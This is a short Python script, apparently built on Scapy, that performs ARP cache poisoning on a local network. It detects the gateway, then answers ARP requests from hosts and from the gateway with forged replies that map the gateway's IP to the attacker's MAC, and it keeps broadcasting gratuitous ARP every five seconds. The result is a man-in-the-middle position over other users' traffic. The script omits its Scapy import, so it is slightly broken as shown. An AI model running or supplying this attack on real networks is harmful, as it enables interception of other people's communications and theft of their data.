#!/usr/bin/env python3
import os
import time

# send arbitray arp packet to get ip and mac of gateway
p = srp1(Ether()/IP(dst='1.2.3.4', ttl=0)/ICMP()/'abcdefgh')

gw_ip = p.payload.src
gw_mac = p.src
my_ip = p.payload.dst
my_mac = p.dst

def log(*s):
    print(time.asctime() + ":", *s)

log('My IP:', my_ip)
log('My MAC:', my_mac)
log('Gateway IP:', gw_ip)
log('Gateway Real MAC:', gw_mac)

def packet_cb(p):
  p = p.payload
  if p.psrc == my_ip or p.hwsrc == my_mac:
    return
  if p.psrc == p.pdst and p.psrc == gw_ip:# Real gateway's gratuitous ARP
    do_reply(gw_ip, 'ff:ff:ff:ff:ff:ff') # gratuitous ARP
    return
  if p.op != 1: # bypass who-has queries
    return
  if p.pdst == gw_ip:
    log('{} at {} is requesting gateway\'s MAC...'.format(p.psrc, p.hwsrc))
    do_reply(gw_ip, p.hwsrc, p.psrc) # spoof victim
    do_reply(p.psrc, gw_mac, gw_ip) # spoof gateway
  elif p.psrc == gw_ip:
    log('Gateway is requesting {}\'s MAC...'.format(p.pdst))
    do_reply(p.pdst, p.hwsrc, p.psrc) # reply to gateway
    do_reply(gw_ip, 'ff:ff:ff:ff:ff:ff') # gratuitous ARP

def do_reply(fake_ip, dst, pdst=''):
  if dst == 'ff:ff:ff:ff:ff:ff':
    # gratuitous ARP
    hwdst = my_mac
    pdst = fake_ip
  else:
    hwdst = dst
  packet = Ether(dst=dst)/ARP(op='is-at',
                       hwsrc=my_mac,
                       psrc=fake_ip,
                       hwdst=hwdst,
                       pdst=pdst)
  log('Sending packet:')
  packet.show()
  sendp(packet * 3)

def main():
  if os.fork():
    do_packet()
  else:
    do_gratuitous()

def do_packet():
  log('Doing packet')
  while True:
    receive = sniff(filter='arp', count=1000, prn=packet_cb)

def do_gratuitous():
  log('Doing gratuitous')
  while True:
    do_reply(gw_ip, 'ff:ff:ff:ff:ff:ff') # gratuitous ARP
    time.sleep(5)


main()
exit()
